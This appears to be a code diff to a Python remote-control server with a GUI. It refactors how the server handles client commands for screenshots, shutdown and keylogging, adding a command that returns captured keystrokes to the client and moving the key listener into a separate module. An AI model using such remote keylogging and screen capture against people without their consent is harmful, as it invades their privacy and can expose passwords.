@@ -12,21 +12,24 @@ import serverfunc
 import pickle
 from pynput.keyboard import Listener, Key
 
-all_processes = []
+
+serverThread = None
+stop = False
+listener = None
 
 
+def connectclient(conn):
+    global stop
 
-
-
-def connectclient(tcpServer):
     while True:
-        (conn, (ip, port)) = tcpServer.accept()
-
         data = conn.recv(2048)
 
         data = data.decode("utf-8")
 
         print(data)
+
+        if stop:
+            break
 
         if data == "take_screenshot":
             image_data = serverfunc.take_screen_shot()
@@ -65,27 +68,12 @@ def connectclient(tcpServer):
         if data == "shutdown":
             serverfunc.shutdown_pc()
         if data == "key_log_listening":
-            listening_keyboard(True)
+            serverfunc.listening_keyboard(True)
         if data == "key_log_stop_listening":
-            listening_keyboard(False)
-
-
-def on_press(key):
-    print('{0} pressed'.format(
-        key))
-    conn.sendall(key)
-# Collect events until released
-
-
-def listening_keyboard(listening=True):
-    if listening:
-        with Listener(
-                on_press=on_press) as listener:
-            listener.join()
-        print(listener)
-    else:
-        return False
-
+            serverfunc.listening_keyboard(False)
+        if data == "get_key_log":
+            result = serverfunc.get_key_log()
+            conn.send(bytes(result, "utf-8"))
 
 def runserver():
     TCP_IP = '127.0.0.1'
@@ -94,19 +82,13 @@ def runserver():
     tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     tcpServer.bind((TCP_IP, TCP_PORT))
-    threads = []
 
     tcpServer.listen(4)
     while True:
         print("Multithreaded Python server : Waiting for connections from TCP clients...")
-        global conn
-        (conn, (ip, port)) = tcpServer.accept()
-        newthread = Process(target=connectclient, args=(tcpServer,))
+        client, _ = tcpServer.accept()
+        newthread = Process(target=connectclient, args=(client,))
         newthread.start()
-        threads.append(newthread)
-
-        global all_processes
-        all_processes.append(newthread)
 
 class Server(QWidget):
 
@@ -153,23 +135,22 @@ class Server(QWidget):
         print("start server")
 
         if not self.start:
+            global serverThread
             serverThread = Process(target=runserver)
             serverThread.start()
-
-            global all_processes
-            all_processes.append(serverThread)
             
             self.start = True
 
 
-
 def off():
-    global all_processes
-
-    print(all_processes)
+    global serverThread
+    global stop
     
-    for p in all_processes:
-        p.terminate()
+    if serverThread:
+        serverThread.terminate()
+
+    serverfunc.listening_keyboard(False)
+    stop = True
 
 def main():
     app = QApplication(sys.argv)
